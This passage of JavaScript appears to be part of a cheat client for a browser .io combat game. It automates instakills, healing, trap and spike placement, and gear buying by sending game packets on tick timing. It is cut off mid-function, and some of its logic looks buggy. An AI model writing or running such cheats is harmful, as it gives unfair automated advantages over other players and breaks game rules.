                this.animTime = this.animSpeed = items.weapons[index].speed;
                this.targetAngle = (didHit ? -config.hitAngle : -Math.PI);
                tmpRatio = 0;
                animIndex = 0;
            };

            // CAN SEE:
            this.canSee = function(other) {
                if (!other) return false;
                let dx = Math.abs(other.x - this.x) - other.scale;
                let dy = Math.abs(other.y - this.y) - other.scale;
                return dx <= (config.maxScreenWidth / 2) * 1.3 && dy <= (config.maxScreenHeight / 2) * 1.3;
            };

            // SHAME SYSTEM:
            this.judgeShame = function() {
                if (this.oldHealth < this.health) {
                    if (this.hitTime) {
                        let timeSinceHit = game.tick - this.hitTime;
                        this.lastHit = game.tick;
                        this.hitTime = 0;
                        if (timeSinceHit < 2) {
                            this.shameCount++;
                        } else {
                            this.shameCount = Math.max(0, this.shameCount - 2);
                        }
                    }
                } else if (this.oldHealth > this.health) {
                    this.hitTime = game.tick;
                }
            };
            this.addShameTimer = function() {
                this.shameCount = 0;
                this.shameTimer = 30;
                let interval = setInterval(() => {
                    this.shameTimer--;
                    if (this.shameTimer <= 0) {
                        clearInterval(interval);
                    }
                }, 1000);
            };

            // CHECK TEAM:
            this.isTeam = function(tmpObj) {
                return (this == tmpObj || (this.team && this.team == tmpObj.team));
            };

            // FOR THE PLAYER:
            this.findAllianceBySid = function(sid) {
                return this.team ? alliancePlayers.find((THIS) => THIS === sid) : null;
            };
            this.checkCanInsta = function(nobull) {
                let totally = 0;
                if (this.alive && inGame) {
                    let primary = {
                        weapon: this.weapons[0],
                        variant: this.primaryVariant,
                        dmg: this.weapons[0] == undefined ? 0 : items.weapons[this.weapons[0]].dmg,
                    };
                    let secondary = {
                        weapon: this.weapons[1],
                        variant: this.secondaryVariant,
                        dmg: this.weapons[1] == undefined ? 0 : items.weapons[this.weapons[1]].Pdmg,
                    };
                    let bull = this.skins[7] && !nobull ? 1.5 : 1;
                    let pV = primary.variant != undefined ? config.weaponVariants[primary.variant].val : 1;
                    if (primary.weapon != undefined && this.reloads[primary.weapon] == 0) {
                        totally += primary.dmg * pV * bull;
                    }
                    if (secondary.weapon != undefined && this.reloads[secondary.weapon] == 0) {
                        totally += secondary.dmg;
                    }
                    if (this.skins[53] && this.reloads[53] <= (player.weapons[1] == 10 ? 0 : game.tickRate) && near.skinIndex != 22) {
                        totally += 25;
                    }
                    totally *= near.skinIndex == 6 ? 0.75 : 1;
                    return totally;
                }
                return 0;
            };

            // UPDATE WEAPON RELOAD:
            this.manageReload = function() {
                if (this.shooting[53]) {
                    this.shooting[53] = 0;
                    this.reloads[53] = (2500 - game.tickRate);
                } else {
                    if (this.reloads[53] > 0) {
                        this.reloads[53] = Math.max(0, this.reloads[53] - game.tickRate);
                    }
                }

                // PREPLACER
                if (this.reloads[this.weaponIndex] <= 1000/9) {
                    // place(2, getAttackDir());
                    let index = this.weaponIndex;
                    let nearObja = liztobj.filter((e) => (e.active || e.alive) && e.health < e.maxHealth && e.group !== undefined && UTILS.getDist(e, player, 0, 2) <= (items.weapons[player.weaponIndex].range + e.scale));
                    for(let i = 0; i < nearObja.length; i++) {
                        let aaa = nearObja[i];

                        let val = items.weapons[index].dmg * (config.weaponVariants[tmpObj[(index < 9 ? "prima" : "seconda") + "ryVariant"]].val) * (items.weapons[index].sDmg || 1) * 3.3;
                        let valaa = items.weapons[index].dmg * (config.weaponVariants[tmpObj[(index < 9 ? "prima" : "seconda") + "ryVariant"]].val) * (items.weapons[index].sDmg || 1);
                        if(aaa.health - (valaa) <= 0 && near.length) {
                            place(near.dist2<((near.scale * 1.8) + 50)?4:2, caf(aaa, player) + Math.PI)
                            console.log("preplaced");
                        }
                    }
                }

                if (this.gathering || this.shooting[1]) {
                    if (this.gathering) {
                        this.gathering = 0;
                        this.reloads[this.gatherIndex] = (items.weapons[this.gatherIndex].speed * (this.skinIndex == 20 ? 0.78 : 1));
                        this.attacked = true;
                    }
                    if (this.shooting[1]) {
                        this.shooting[1] = 0;
                        this.reloads[this.shootIndex] = (items.weapons[this.shootIndex].speed * (this.skinIndex == 20 ? 0.78 : 1));
                        this.attacked = true;
                    }
                } else {
                    this.attacked = false;
                    if (this.buildIndex < 0) {
                        if (this.reloads[this.weaponIndex] > 0) {
                            // Math.max(0, this.reloads[this.weaponIndex] - game.tickRate)
                            this.reloads[this.weaponIndex] = Math.max(0, this.reloads[this.weaponIndex] - 110);
                            if (this == player) {
                                if (getEl("weaponGrind").checked) {
                                    for (let i = 0; i < Math.PI * 2; i += Math.PI / 2) {
                                        checkPlace(player.getItemType(22), i);
                                    }
                                }
                            }
                            if (this.reloads[this.primaryIndex] == 0 && this.reloads[this.weaponIndex] == 0) {
                                this.antiBull++;
                                game.tickBase(() => {
                                    this.antiBull = 0;
                                }, 1);
                            }
                        }
                    }
                }
            };

            // FOR ANTI INSTA:
            this.addDamageThreat = function(tmpObj) {
                let primary = {
                    weapon: this.primaryIndex,
                    variant: this.primaryVariant
                };
                primary.dmg = primary.weapon == undefined ? 45 : items.weapons[primary.weapon].dmg;
                let secondary = {
                    weapon: this.secondaryIndex,
                    variant: this.secondaryVariant
                };
                secondary.dmg = secondary.weapon == undefined ? 75 : items.weapons[secondary.weapon].Pdmg;
                let bull = 1.5;
                let pV = primary.variant != undefined ? config.weaponVariants[primary.variant].val : 1.18;
                let sV = secondary.variant != undefined ? [9, 12, 13, 15].includes(secondary.weapon) ? 1 : config.weaponVariants[secondary.variant].val : 1.18;
                if (primary.weapon == undefined ? true : this.reloads[primary.weapon] == 0) {
                    this.damageThreat += primary.dmg * pV * bull;
                }
                if (secondary.weapon == undefined ? true : this.reloads[secondary.weapon] == 0) {
                    this.damageThreat += secondary.dmg * sV;
                }
                if (this.reloads[53] <= game.tickRate) {
                    this.damageThreat += 25;
                }
                this.damageThreat *= tmpObj.skinIndex == 6 ? 0.75 : 1;
                if (!this.isTeam(tmpObj)) {
                    if (this.dist2 <= 300) {
                        tmpObj.damageThreat += this.damageThreat;
                    }
                }
            };

        }
    };

    // SOME CODES:
    function sendUpgrade(index) {
        player.reloads[index] = 0;
        packet("H", index);
    }

    function storeEquip(id, index) {
        packet("c", 0, id, index);
    }

    function storeBuy(id, index) {
        packet("c", 1, id, index);
    }

    function buyEquip(id, index) {
        let nID = player.skins[6] ? 6 : 0;
        if (player.alive && inGame) {
            if (index == 0) {
                if (player.skins[id]) {
                    if (player.latestSkin != id) {
                        packet("c", 0, id, 0);
                    }
                } else {
                    if (configs.autoBuyEquip) {
                        let find = findID(hats, id);
                        if (find) {
                            if (player.points >= find.price) {
                                packet("c", 1, id, 0);
                                packet("c", 0, id, 0);
                            } else {
                                if (player.latestSkin != nID) {
                                    packet("c", 0, nID, 0);
                                }
                            }
                        } else {
                            if (player.latestSkin != nID) {
                                packet("c", 0, nID, 0);
                            }
                        }
                    } else {
                        if (player.latestSkin != nID) {
                            packet("c", 0, nID, 0);
                        }
                    }
                }
            } else if (index == 1) {
                if (useWasd && (id != 11 && id != 0)) {
                    if (player.latestTail != 0) {
                        packet("c", 0, 0, 1);
                    }
                    return;
                }
                if (player.tails[id]) {
                    if (player.latestTail != id) {
                        packet("c", 0, id, 1);
                    }
                } else {
                    if (configs.autoBuyEquip) {
                        let find = findID(accessories, id);
                        if (find) {
                            if (player.points >= find.price) {
                                packet("c", 1, id, 1);
                                packet("c", 0, id, 1);
                            } else {
                                if (player.latestTail != 0) {
                                    packet("c", 0, 0, 1);
                                }
                            }
                        } else {
                            if (player.latestTail != 0) {
                                packet("c", 0, 0, 1);
                            }
                        }
                    } else {
                        if (player.latestTail != 0) {
                            packet("c", 0, 0, 1);
                        }
                    }
                }
            }
        }
    }

    function selectToBuild(index, wpn) {
        packet("z", index, wpn);
    }

    function selectWeapon(index, isPlace) {
        if (!isPlace) {
            player.weaponCode = index;
        }
        packet("z", index, 1);
    }

    function sendAutoGather() {
        packet("K", 1, 1);
    }

    function sendAtck(id, angle) {
        packet("F", id, angle, 1);
    }

    // PLACER:
    function place(id, rad, rmd) {
        try {
            if (id == undefined) return;
            let item = items.list[player.items[id]];
            let tmpS = player.scale + item.scale + (item.placeOffset || 0);
            let tmpX = player.x2 + tmpS * Math.cos(rad);
            let tmpY = player.y2 + tmpS * Math.sin(rad);
            if ((player.alive && inGame && player.itemCounts[item.group.id] == undefined ? true : player.itemCounts[item.group.id] < (config.isSandbox ? 299 : item.group.limit ? item.group.limit : 99))) {
                selectToBuild(player.items[id]);
                sendAtck(1, rad);
                selectWeapon(player.weaponCode, 1);
                if (rmd && getEl("placeVis").checked) {
                    placeVisible.push({
                        x: tmpX,
                        y: tmpY,
                        name: item.name,
                        scale: item.scale,
                        dir: rad
                    });
                    game.tickBase(() => {
                        placeVisible.shift();
                    }, 1)
                }
            }
        } catch (e) {}
    }

    function checkPlace(id, rad) {
        try {
            if (id == undefined) return;
            let item = items.list[player.items[id]];
            let tmpS = player.scale + item.scale + (item.placeOffset || 0);
            let tmpX = player.x2 + tmpS * Math.cos(rad);
            let tmpY = player.y2 + tmpS * Math.sin(rad);
            if (objectManager.checkItemLocation(tmpX, tmpY, item.scale, 0.6, item.id, false, player)) {
                place(id, rad, 1);
            }
        } catch (e) {}
    }

    // HEALING:
    function soldierMult() {
        return player.latestSkin == 6 ? 0.75 : 1;
    }

    function healthBased() {
        if (player.health == 100)
            return 0;
        if ((player.skinIndex != 45 && player.skinIndex != 56)) {
            return Math.ceil((100 - player.health) / items.list[player.items[0]].healing);
        }
        return 0;
    }

    function getAttacker(damaged) {
        let attackers = enemy.filter(tmp => {
            //let damages = new Damages(items);
            //let dmg = damages.weapons[tmp.weaponIndex];
            //let by = tmp.weaponIndex < 9 ? [dmg[0], dmg[1], dmg[2], dmg[3]] : [dmg[0], dmg[1]];
            let rule = {
                //one: tmp.dist2 <= 300,
                //two: by.includes(damaged),
                three: tmp.attacked
            }
            return /*rule.one && rule.two && */ rule.three;
        });
        return attackers;
    }

    function healer() {
        for (let i = 0; i < healthBased(); i++) {
            place(0, getAttackDir());
        }
    }

    function antiSyncHealing(timearg) {
        my.antiSync = true;
        sendChat("");
        let healAnti = setInterval(() => {
            if (player.shameCount < 5) {
                place(0, getAttackDir());
            }
        }, 75);
        setTimeout(() => {
            clearInterval(healAnti);
            setTimeout(() => {
                my.antiSync = false;
            }, game.tickRate);
        }, game.tickRate);
    }
    function applCxC(value) {
        if (player.health == 100)
            return 0;
        if (player.skinIndex != 45 && player.skinIndex != 56) {
            return Math.ceil(value / items.list[player.items[0]].healing);
        }
        return 0;
    }
    function calcDmg(value) {
        return value * player.skinIndex == 6 ? 0.75 : 1;
    }
    function biomeGear(mover, returns) {
        if (player.y2 >= config.mapScale / 2 - config.riverWidth / 2 && player.y2 <= config.mapScale / 2 + config.riverWidth / 2) {
            if (returns) return 31;
            buyEquip(31, 0);
        } else {
            if (player.y2 <= config.snowBiomeTop) {
                if (returns) return mover && player.moveDir == undefined ? 22 : 15;
                buyEquip(mover && player.moveDir == undefined ? 22 : 15, 0);
            } else {
                if (returns) return mover && player.moveDir == undefined ? 22 : 12;
                buyEquip(mover && player.moveDir == undefined ? 22 : 12, 0);
            }
        }
        if (returns) return 0;
    }
    let advHeal = [];

    class Traps {
        constructor(UTILS, items) {
            this.dist = 0;
            this.aim = 0;
            this.inTrap = false;
            this.replaced = false;
            this.antiTrapped = false;
            this.info = {};
            this.notFast = function() {
                return player.weapons[1] == 10 && ((this.info.health > items.weapons[player.weapons[0]].dmg) || player.weapons[0] == 5);
            }
            this.testCanPlace = function(id, first = -(Math.PI / 2), repeat = (Math.PI / 2), plus = (Math.PI / 18), radian, replacer, yaboi) {
                try {
                    let item = items.list[player.items[id]];
                    let tmpS = player.scale + item.scale + (item.placeOffset || 0);
                    let counts = {
                        attempts: 0,
                        placed: 0
                    };
                    let tmpObjects = [];
                    gameObjects.forEach((p) => {
                        tmpObjects.push({
                            x: p.x,
                            y: p.y,
                            active: p.active,
                            blocker: p.blocker,
                            scale: p.scale,
                            isItem: p.isItem,
                            type: p.type,
                            colDiv: p.colDiv,
                            getScale: function(sM, ig) {
                                sM = sM || 1;
                                return this.scale * ((this.isItem || this.type == 2 || this.type == 3 || this.type == 4)
                                                     ? 1 : (0.6 * sM)) * (ig ? 1 : this.colDiv);
                            },
                        });
                    });
                    for (let i = first; i < repeat; i += plus) {
                        counts.attempts++;
                        let relAim = radian + i;
                        let tmpX = player.x2 + tmpS * Math.cos(relAim);
                        let tmpY = player.y2 + tmpS * Math.sin(relAim);
                        let cantPlace = tmpObjects.find((tmp) => tmp.active && UTILS.getDistance(tmpX, tmpY, tmp.x, tmp.y) < item.scale + (tmp.blocker ? tmp.blocker : tmp.getScale(0.6, tmp.isItem)));
                        if (cantPlace) continue;
                        if (item.id != 19 && tmpY >= config.mapScale / 2 - config.riverWidth / 2 && tmpY <= config.mapScale / 2 + config.riverWidth / 2) continue;
                        if ((!replacer && yaboi) || useWasd) {
                            if (useWasd ? false : yaboi.inTrap) {
                                if (UTILS.getAngleDist(near.aim2 + Math.PI, relAim + Math.PI) <= Math.PI) {
                                    place(2, relAim, 1);
                                } else {
                                    player.items[4] == 15 && place(4, relAim, 1);
                                }
                            } else {
                                if (UTILS.getAngleDist(near.aim2, relAim) <= config.gatherAngle / 1.5) {
                                    place(2, relAim, 1);
                                } else {
                                    player.items[4] == 15 && place(4, relAim, 1);
                                }
                            }
                        } else {
                            place(id, relAim, 1);
                        }
                        tmpObjects.push({
                            x: tmpX,
                            y: tmpY,
                            active: true,
                            blocker: item.blocker,
                            scale: item.scale,
                            isItem: true,
                            type: null,
                            colDiv: item.colDiv,
                            getScale: function() {
                                return this.scale;
                            },
                        });
                        if (UTILS.getAngleDist(near.aim2, relAim) <= 1) {
                            counts.placed++;
                        }
                    }
                    if (counts.placed > 0 && replacer && item.dmg) {
                        if (near.dist2 <= items.weapons[player.weapons[0]].range + (player.scale * 1.8) && configs.spikeTick) {
                            instaC.canSpikeTick = true;
                        }
                    }
                } catch (err) {
                }
            };

            this.checkSpikeTick = function() {
                try {
                    if (![3, 4, 5].includes(near.primaryIndex)) return false;
                    if ((getEl("safeAntiSpikeTick").checked || my.autoPush) ? false : near.primaryIndex == undefined ? true : (near.reloads[near.primaryIndex] > game.tickRate)) return false;
                    // more range for safe. also testing near.primaryIndex || 5
                    if (near.dist2 <= items.weapons[near.primaryIndex || 5].range + (near.scale * 1.8)) {
                        let item = items.list[9];
                        let tmpS = near.scale + item.scale + (item.placeOffset || 0);
                        let danger = 0;
                        let counts = {
                            attempts: 0,
                            block: `unblocked`
                        };
                        for (let i = -1; i <= 1; i += 1 / 10) {
                            counts.attempts++;
                            let relAim = UTILS.getDirect(player, near, 2, 2) + i;
                            let tmpX = near.x2 + tmpS * Math.cos(relAim);
                            let tmpY = near.y2 + tmpS * Math.sin(relAim);
                            let cantPlace = gameObjects.find((tmp) => tmp.active && UTILS.getDistance(tmpX, tmpY, tmp.x, tmp.y) < item.scale + (tmp.blocker ? tmp.blocker : tmp.getScale(0.6, tmp.isItem)));
                            if (cantPlace) continue;
                            if (tmpY >= config.mapScale / 2 - config.riverWidth / 2 && tmpY <= config.mapScale / 2 + config.riverWidth / 2) continue;
                            danger++;
                            counts.block = `blocked`;
                            break;
                        }
                        if (danger) {
                            my.anti0Tick = 1;
                            player.chat.count = 100000;
                            return true;
                        }
                    }
                } catch (err) {
                    return null;
                }
                return false;
            }
            this.protect = function(aim) {
                sendChat("");
                if (!configs.antiTrap) return;
                if (player.items[4]) {
                    this.testCanPlace(4, -(Math.PI / 2), (Math.PI / 2), (Math.PI / 18), aim + Math.PI);
                    this.antiTrapped = true;
                }
            };
            /*this.autoPlace = function() {
                        if (enemy.length && configs.autoPlace && !instaC.ticking) {
                            if (game.tick % (Math.max(1, parseInt(getEl("autoPlaceTick").value)) || 1) === 0) {
                                if (gameObjects.length) {
                                    let near2 = {
                                        inTrap: false,
                                    };
                                    let nearTrap = gameObjects.filter(e => e.trap && e.active && e.isTeamObject(player) && UTILS.getDist(e, near, 0, 2) <= (near.scale + e.getScale() + 5)).sort(function(a, b) {
                                        return UTILS.getDist(a, near, 0, 2) - UTILS.getDist(b, near, 0, 2);
                                    })[0];
                                    if (nearTrap) {
                                        near2.inTrap = true;
                                    } else {
                                        near2.inTrap = false;
                                    }
                                    if ((near.dist3 <= 450)) {
                                        if (near.dist3 <= 200) {
                                            this.testCanPlace(4, 0, (Math.PI * 2), (Math.PI / 24), near.aim2, 0, {
                                                inTrap: near2.inTrap
                                            });
                                        } else {
                                            player.items[4] == 15 && this.testCanPlace(4, 0, (Math.PI * 2), (Math.PI / 24), near.aim2);
                                        }
                                    }
                                } else {
                                    if ((near.dist3 <= 450)) {
                                        player.items[4] == 15 && this.testCanPlace(4, 0, (Math.PI * 2), (Math.PI / 24), near.aim2);
                                    }
                                }
                            }
                        }
                    };*/
            this.autoPlace = function () {
                if (enemy.length && configs.autoPlace && !instaC.ticking) {
                    if (game.tick % (Math.max(1, parseInt(getEl("autoPlaceTick").value))||1) === 0) {
                        if (gameObjects.length) {
                            let near2 = {
                                inTrap: true,
                            };
                            let nearTrap = gameObjects.filter(e => e.trap && e.active && e.isTeamObject(player) && UTILS.getDist(e, near, 0, 2) <= (near.scale + e.getScale() + 5)).sort(function (a, b) {
                                return UTILS.getDist(a, near, 0, 2) - UTILS.getDist(b, near, 0, 2);
                            })[0];
                            if (nearTrap) {
                                near2.inTrap = true;
                            } else {
                                near2.inTrap = true;
                            }
                            if ((near.dist2 <= 375)) {
                                if (near.dist2 <= 200) {
                                    this.testCanPlace(4, 0, (Math.PI * 2), (Math.PI / 24), near.aim2, 0, {inTrap: near2.inTrap});
                                } else {
                                    player.items[4] == 15 && this.testCanPlace(4, 0, (Math.PI * 2), (Math.PI / 24), near.aim2);
                                }
                            }
                        } else {
                            if ((near.dist2 <= 1000)) {
                                player.items[4] == 15 && this.testCanPlace(4, 0, (Math.PI * 2), (Math.PI / 24), near.aim2);
                            }
                        }
                    }
                }
            };
            this.replacer = function (findObj) {
                if (!findObj || !configs.autoReplace) return;
                if (!inGame) return;
                if (this.antiTrapped) return;
                game.tickBase(() => {
                    let objAim = UTILS.getDirect(findObj, player, 0, 2);
                    let objDst = UTILS.getDist(findObj, player, 0, 2);
                    if (getEl("weaponGrind").checked && objDst <= items.weapons[player.weaponIndex].range + player.scale) return;
                    if (objDst <= 400 && near.dist2 <= 400) {
                        let danger = this.checkSpikeTick();
                        if (!danger && near.dist2 <= items.weapons[near.primaryIndex || 5].range + (near.scale * 1.8)) {
                            //this.testCanPlace(2, -(Math.PI / 2), (Math.PI / 2), (Math.PI / 18), objAim, 1);
                            this.testCanPlace(2, 0, (Math.PI * 2), (Math.PI / 24), objAim, 1);
                        } else {
                            player.items[4] == 15 && this.testCanPlace(4, 0, (Math.PI * 2), (Math.PI / 24), objAim, 1);
                        }
                        this.replaced = true;
                    }
                }, 1);
            };
        }
    };
    /*   this.replacer = function(findObj) {
                        if (!findObj || !configs.autoReplace) return;
                        if (!inGame) return;
                        if (this.antiTrapped) return;

                        game.tickBase(() => {
                            let objAim = UTILS.getDirect(findObj, player, 0, 2);
                            let objDst = UTILS.getDist(findObj, player, 0, 2);

                            let perfectAngle = calculatePerfectAngle(findObj.x, findObj.y, player.x, player.y);

                            if (getEl("weaponGrind").checked && objDst <= items.weapons[player.weaponIndex].range + player.scale) return;

                            if (objDst <= 400 && near.dist2 <= 400) {
                                if (isObjectBroken(findObj)) {
                                    let danger = this.checkSpikeTick();
                                    if (!danger && near.dist2 <= items.weapons[near.primaryIndex || 5].range + (near.scale * 1.8)) {
                                        this.testCanPlace(2, 0, (Math.PI * 2), (Math.PI / 24), perfectAngle , 1);
                                    } else {
                                        if (player.items[4] == 15) {
                                            this.testCanPlace(4, 0, (Math.PI * 2), (Math.PI / 24), perfectAngle , 1);
                                        }
                                    }
                                    this.replaced = true;
                                }
                            }
                        }, 1);
                    }
                }
            }*/

    function calculatePerfectAngle(x1, y1, x2, y2) {
        return Math.atan2(y2 - y1, x2 - x1);
    }
    function isObjectBroken(object) {
        const healthThreshold = 20;
        return object.health < healthThreshold;
    }

    /*this.replacer = function (findObj) {
                        if (!findObj || !configs.autoReplace) return;
                        if (!inGame) return;
                        if (this.antiTrapped) return;
                        game.tickBase(() => {
                            let objAim = UTILS.getDirect(findObj, player, 0, 2);
                            let objDst = UTILS.getDist(findObj, player, 0, 2);
                            if (getEl("weaponGrind").checked && objDst <= items.weapons[player.weaponIndex].range + player.scale) return;
                            if (objDst <= 400 && near.dist2 <= 400) {
                                let danger = this.checkSpikeTick();
                                if (!danger && near.dist2 <= items.weapons[near.primaryIndex + 5].range + (near.scale * 1.8)) {
                                    //this.testCanPlace(2, -(Math.PI / 2), (Math.PI / 2), (Math.PI / 18), objAim, 1);
                                    this.testCanPlace(2, 0, (Math.PI * 2), (Math.PI / 24), objAim, 1);
                                } else {
                                    player.items[4] == 15 && this.testCanPlace(4, 0, (Math.PI * 2), (Math.PI / 24), objAim, 1);
                                }
                                this.replaced = true;
                            }
                        }, 1);
                    };
                }
            }*/
    class Instakill {
        constructor() {
            this.wait = false;
            this.can = false;
            this.isTrue = false;
            this.nobull = false;
            this.ticking = false;
            this.canSpikeTick = false;
            this.startTick = false;
            this.readyTick = false;
            this.canCounter = false;
            this.revTick = false;
            this.syncHit = false;
            this.changeType = function(type) {
                this.wait = false;
                this.isTrue = true;
                my.autoAim = true;
                let instaLog = [type];
                if (type == "rev") {
                    selectWeapon(player.weapons[1]);
                    buyEquip(53, 0);
                    sendAutoGather();
                    setTimeout(() => {
                        selectWeapon(player.weapons[0]);
                        buyEquip(7, 0);
                        setTimeout(() => {
                            sendAutoGather();
                            this.isTrue = false;
                            my.autoAim = false;
                        }, 225);
                    }, 100);
                } else if (type == "nobull") {
                    selectWeapon(player.weapons[0]);
                    buyEquip(7, 0);
                    sendAutoGather();
                    setTimeout(() => {
                        selectWeapon(player.weapons[1]);
                        buyEquip(player.reloads[53] == 0 ? 53 : 6, 0);
                        setTimeout(() => {
                            sendAutoGather();
                            this.isTrue = false;
                            my.autoAim = false;
                        }, 255);
                    }, 105);
                } else if (type == "normal") {
                    selectWeapon(player.weapons[0]);
                    buyEquip(7, 0);
                    sendAutoGather();
                    setTimeout(() => {
                        selectWeapon(player.weapons[1]);
                        buyEquip(player.reloads[53] == 0 ? 53 : 6, 0);
                        setTimeout(() => {
                            sendAutoGather();
                            this.isTrue = false;
                            my.autoAim = false;
                        }, 255);
                    }, 100);
                } else {
                    setTimeout(() => {
                        this.isTrue = false;
                        my.autoAim = false;
                    }, 50);
                }
            };
            this.spikeTickType = function() {
                sendChat("");
                this.isTrue = true;
                my.autoAim = true;
                selectWeapon(player.weapons[0]);
                buyEquip(7, 0);
                sendAutoGather();
                game.tickBase(() => {
                    //if (player.reloads[53] == 0 && getEl("turretCombat").checked) {
                    buyEquip(53, 0);
                    selectWeapon(player.weapons[0]);
                    buyEquip(53, 0);
                    //buyEquip(21, 1);
                    game.tickBase(() => {
                        sendAutoGather();
                        this.isTrue = false;
                        my.autoAim = false;
                        buyEquip(6, 0);
                        buyEquip(21, 1);
                    }, 3);
                }, 1);
            };
            /* this.spikeTickType = function() {
                        this.isTrue = true;
                        my.autoAim = true;
                        selectWeapon(player.weapons[0]);
                        buyEquip(7, 0);
                        buyEquip(21, 1);
                        sendAutoGather();
                        game.tickBase(() => {
                            if (player.reloads[53] == 0 && getEl("turretCombat").checked) {
                                selectWeapon(player.weapons[0]);
                                buyEquip(53, 0);
                                buyEquip(21, 1);
                                game.tickBase(() => {
                                    sendAutoGather();
                                    this.isTrue = false;
                                    my.autoAim = false;
                                }, 1);
                            } else {
                                sendAutoGather();
                                this.isTrue = false;
                                my.autoAim = false;
                            }
                        }, 1);
                    };*/
            this.counterType = function() {
                this.isTrue = true;
                my.autoAim = true;
                selectWeapon(player.weapons[0]);
                buyEquip(7, 0);
                buyEquip(21, 1);
                sendAutoGather();
                game.tickBase(() => {
                    if (player.reloads[53] == 0 && getEl("turretCombat").checked) {
                        selectWeapon(player.weapons[0]);
                        buyEquip(53, 0);
                        buyEquip(21, 1);
                        game.tickBase(() => {
                            sendAutoGather();
                            this.isTrue = false;
                            my.autoAim = false;
                        }, 1);
                    } else {
                        sendAutoGather();
                        this.isTrue = false;
                        my.autoAim = false;
                    }
                }, 1);
            };
            this.antiCounterType = function() {
                my.autoAim = true;
                this.isTrue = true;
                inantiantibull = true;
                selectWeapon(player.weapons[0]);
                buyEquip(6, 0);
                buyEquip(21, 1);
                io.send("D", near.aim2);
                sendAutoGather();
                game.tickBase(() => {
                    buyEquip(player.reloads[53] == 0 ? player.skins[53] ? 53 : 6 : 6, 0);
                    buyEquip(21, 1);
                    game.tickBase(() => {
                        sendAutoGather();
                        this.isTrue = false;
                        my.autoAim = false;
                        inantiantibull = false;
                    }, 1);
                }, 1)
            };
            this.rangeType = function(type) {
                this.isTrue = true;
                my.autoAim = true;
                if (type == "ageInsta") {
                    sendChat("info gived");
                    my.ageInsta = false;
                    if (player.items[5] == 18) {
                        place(5, near.aim2);
                    }
                    packet("f", undefined, 1);
                    buyEquip(22, 0);
                    buyEquip(21, 1);
                    game.tickBase(() => {
                        selectWeapon(player.weapons[1]);
                        buyEquip(53, 0);
                        buyEquip(21, 1);
                        sendAutoGather();
                        game.tickBase(() => {
                            sendUpgrade(12);
                            selectWeapon(player.weapons[1]);
                            buyEquip(53, 0);
                            buyEquip(21, 1);
                            game.tickBase(() => {
                                sendUpgrade(15);
                                selectWeapon(player.weapons[1]);
                                buyEquip(53, 0);
                                buyEquip(21, 1);
                                game.tickBase(() => {
                                    sendAutoGather();
                                    this.isTrue = false;
                                    my.autoAim = false;
                                }, 1);
                            }, 1);
                        }, 1);
                    }, 1);
                } else {
                    selectWeapon(player.weapons[1]);
                    if (player.reloads[53] == 0 && near.dist2 <= 700 && near.skinIndex != 22) {
                        buyEquip(53, 0);
                    } else {
                        buyEquip(20, 0);
                    }
                    buyEquip(11, 1);
                    sendAutoGather();
                    game.tickBase(() => {
                        sendAutoGather();
                        this.isTrue = false;
                        my.autoAim = false;
                    }, 1);
                }
            };
            this.oneTickType = function() {
                io.send("7113213.29154");
                this.isTrue = true;
                my.autoAim = true;
                selectWeapon(player.weapons[1]);
                buyEquip(53, 0);
                buyEquip(19, 1);
                packet("f", near.aim2, 1);
                if (player.weapons[1] == 15) {
                    my.revAim = true;
                    sendAutoGather();
                }
                game.tickBase(() => {
                    my.revAim = false;
                    selectWeapon(player.weapons[0]);
                    buyEquip(7, 0);
                    buyEquip(19, 1);
                    packet("f", near.aim2, 1);
                    if (player.weapons[1] != 15) {
                        sendAutoGather();
                    }
                    game.tickBase(() => {
                        sendAutoGather();
                        this.isTrue = false;
                        my.autoAim = false;
                        packet("f", undefined, 1);
                    }, 1);
                }, 1);
            };
            this.threeOneTickType = function() {
                io.send("Tick2");
                this.isTrue = true;
                my.autoAim = true;
                selectWeapon(player.weapons[[10, 14].includes(player.weapons[1]) ? 1 : 0]);
                biomeGear();
                buyEquip(19, 1);
                packet("f", near.aim2, 1);
                game.tickBase(() => {
                    selectWeapon(player.weapons[[10, 14].includes(player.weapons[1]) ? 1 : 0]);
                    buyEquip(53, 0);
                    buyEquip(19, 1);
                    packet("f", near.aim2, 1);
                    game.tickBase(() => {
                        selectWeapon(player.weapons[0]);
                        buyEquip(7, 0);
                        buyEquip(19, 1);
                        sendAutoGather();
                        packet("f", near.aim2, 1);
                        game.tickBase(() => {
                            sendAutoGather();
                            this.isTrue = false;
                            my.autoAim = false;
                            packet("f", undefined, 1);
                        }, 1);
                    }, 1);
                }, 1);
            };
            this.kmTickType = function() {
                this.isTrue = true;
                my.autoAim = true;
                my.revAim = true;
                selectWeapon(player.weapons[1]);
                buyEquip(53, 0);
                buyEquip(19, 1);
                sendAutoGather();
                packet("f", near.aim2, 1);
                game.tickBase(() => {
                    my.revAim = false;
                    selectWeapon(player.weapons[0]);
                    buyEquip(7, 0);
                    buyEquip(19, 1);
                    packet("f", near.aim2, 1);
                    game.tickBase(() => {
                        sendAutoGather();
                        this.isTrue = false;
                        my.autoAim = false;
                        packet("f", undefined, 1);
                    }, 1);
                }, 1);
            };
            this.boostTickType = function() {
                /*this.isTrue = true;
                        my.autoAim = true;
                        selectWeapon(player.weapons[0]);
                        buyEquip(53, 0);
                        buyEquip(19, 1);
                        packet("f", near.aim2);
                        game.tickBase(() => {
                            place(4, near.aim2);
                            selectWeapon(player.weapons[1]);
                            biomeGear();
                            buyEquip(19, 1);
                            sendAutoGather();
                            packet("f", near.aim2);
                            game.tickBase(() => {
                                selectWeapon(player.weapons[0]);
                                buyEquip(7, 0);
                                buyEquip(19, 1);
                                packet("f", near.aim2);
                                game.tickBase(() => {
                                    sendAutoGather();
                                    this.isTrue = false;
                                    my.autoAim = false;
                                    packet("f", undefined);
                                }, 1);
                            }, 1);
                        }, 1);*/
                this.isTrue = true;
                my.autoAim = true;
                biomeGear();
                buyEquip(19, 1);
                packet("f", near.aim2, 1);
                game.tickBase(() => {
                    if (player.weapons[1] == 15) {
                        my.revAim = true;
                    }
                    selectWeapon(player.weapons[[9, 12, 13, 15].includes(player.weapons[1]) ? 1 : 0]);
                    buyEquip(53, 0);
                    buyEquip(19, 1);
                    if ([9, 12, 13, 15].includes(player.weapons[1])) {
                        sendAutoGather();
                    }
                    packet("f", near.aim2, 1);
                    place(4, near.aim2);
                    game.tickBase(() => {
                        my.revAim = false;
                        selectWeapon(player.weapons[0]);
                        buyEquip(7, 0);
                        buyEquip(19, 1);
                        if (![9, 12, 13, 15].includes(player.weapons[1])) {
                            sendAutoGather();
                        }
                        packet("f", near.aim2, 1);
                        game.tickBase(() => {
                            sendAutoGather();
                            this.isTrue = false;
